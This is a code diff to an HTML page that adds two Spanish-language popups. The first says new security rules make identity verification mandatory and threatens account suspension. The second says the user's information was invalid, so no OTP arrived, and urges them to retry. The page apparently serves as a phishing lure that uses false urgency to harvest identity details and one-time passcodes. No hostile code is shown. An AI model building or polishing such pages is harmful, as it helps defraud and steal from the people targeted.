@@ -13,9 +13,17 @@
                 <!-- First screen with download.jpg -->
                 <div class="background-image first-screen"></div>
                 
-                <!-- Importance Notice Screen -->
-                <div class="importance-notice-screen" id="importance-notice-screen">
-                    <button class="importance-understand-btn" onclick="proceedToHomeScreen()">Entiendo</button>
+                <!-- Importance Notice Popup -->
+                <div class="importance-popup-overlay" id="importance-popup-overlay">
+                    <div class="importance-popup">
+                        <h2 class="importance-popup-title">Aviso Importante</h2>
+                        <div class="importance-popup-content">
+                            <p>Según las nuevas normas de seguridad, la verificación de identidad ahora es obligatoria para todos los usuarios.</p>
+                            <p>Por favor, verifique su identificación para mantener su cuenta activa.</p>
+                            <p>Si no completa el proceso de verificación, su cuenta podría ser suspendida.</p>
+                        </div>
+                        <button class="importance-popup-btn" onclick="proceedToHomeScreen()">Entiendo</button>
+                    </div>
                 </div>
                 
                 <!-- Second screen with bg .png and content -->
@@ -261,6 +269,17 @@
                                 </button>
                             </div>
                         </div>
+                    </div>
+                </div>
+                
+                <!-- OTP Error Popup -->
+                <div class="otp-error-popup-overlay" id="otp-error-popup-overlay">
+                    <div class="otp-error-popup">
+                        <h2 class="otp-error-popup-title">Error</h2>
+                        <div class="otp-error-popup-content">
+                            <p>Has introducido información inválida/incorrecta, por eso no has recibido el OTP. Vuelve a intentarlo con tu información.</p>
+                        </div>
+                        <button class="otp-error-popup-btn" onclick="closeOTPErrorPopup()">Reintentar</button>
                     </div>
                 </div>
                 
